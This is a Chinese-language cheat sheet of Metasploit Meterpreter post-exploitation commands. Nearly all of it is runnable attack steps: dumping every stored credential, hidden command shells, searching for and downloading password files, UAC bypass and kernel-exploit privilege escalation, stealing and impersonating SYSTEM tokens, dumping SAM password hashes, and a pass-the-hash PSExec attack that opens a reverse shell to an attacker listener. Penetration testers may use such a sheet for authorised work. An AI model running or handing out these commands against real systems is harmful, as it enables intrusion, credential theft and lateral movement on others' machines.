# meterpreter

列出所有凭据
```
creds_all
```
## 系统命令

1. execute执行文件

```
execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互
```

2. migrate进程迁移

```
getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中
kill <pid值>   #杀死进程
```


## 文件系统命令

1. 基本文件系统命令

```
getwd 或者pwd # 查看当前工作目录  
ls
cd
search -f *pass*       # 搜索文件  -h查看帮助
cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容
upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上
download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上
edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件
rm C:\\lltest\\hack.txt
mkdir lltest2  #只能在当前目录下创建文件夹
rmdir lltest2  #只能删除当前目录下文件夹
getlwd   或者 lpwd   #操作攻击者主机 查看当前目录
lcd /tmp   #操作攻击者主机 切换目录
```

## 信息收集

```
/usr/share/metasploit-framework/modules/post/windows/gather
/usr/share/metasploit-framework/modules/post/linux/gather
```


```
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找域控
```


## 提权

1. getsystem提权
```
getsystem
```


2. bypassuac

```
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
use windows/local/bypassuac_vbs
use windows/local/ask
```

3. 内核漏洞提权
可先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权
```
meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
msf > use exploit/windows/local/ms13_053_schlamperei
msf > set SESSION 2
msf > exploit
```


4. 自动枚举

```
multi/recon/local_exploit_suggester
```


## 令牌操纵
1.  incognito模块

```
use incognito      #help incognito  查看帮助
list_tokens -u    #查看可用的token
impersonate_token 'NT AUTHORITY\SYSTEM'  #假冒SYSTEM token

# 或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\
execute -f cmd.exe -i –t    # -t 使用假冒的token 执行

#或者直接shell
rev2self   #返回原始token
```

2. steal_token窃取令牌

```
steal_token <pid值>   #从指定进程中窃取token   先ps
drop_token  #删除窃取的token
```

## 哈希利用

1. 获取哈希

```
run post/windows/gather/smart_hashdump  #从SAM导出密码哈希
#需要SYSTEM权限
```

2. PSExec哈希传递

```
msf > use exploit/windows/smb/psexec
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST 192.168.159.134
msf > set LPORT 443
msf > set RHOST 192.168.159.144
msf >set SMBUser Administrator
msf >set SMBPass aad3b4*****04ee:5b5f00*****c424c
msf >set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain
msf >exploit
```
